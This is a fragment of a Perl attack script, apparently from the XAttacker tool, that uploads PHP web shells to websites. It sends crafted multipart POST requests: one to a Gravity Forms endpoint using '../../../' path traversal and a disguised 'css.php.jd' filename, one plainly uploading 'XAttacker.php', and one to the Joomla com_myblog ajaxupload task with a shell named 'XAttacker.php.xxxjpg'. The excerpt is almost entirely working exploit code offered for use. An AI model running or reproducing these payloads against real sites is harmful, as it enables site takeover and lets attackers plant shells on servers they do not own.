...
my $gravityformsres = $ua->post($url, Content_Type => "form-data", Content => [file => ["files/XAttacker2.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "css.php.jd"]);
...
my $response = $ua->post($url, Content_Type => "form-data", Content => [file => ["files/XAttacker.jpg"], name => "XAttacker.php"]);
...
sub comblog(){
my $url = "$site/index.php?option=com_myblog&task=ajaxupload";
my $shell ="files/XAttacker.php.xxxjpg";
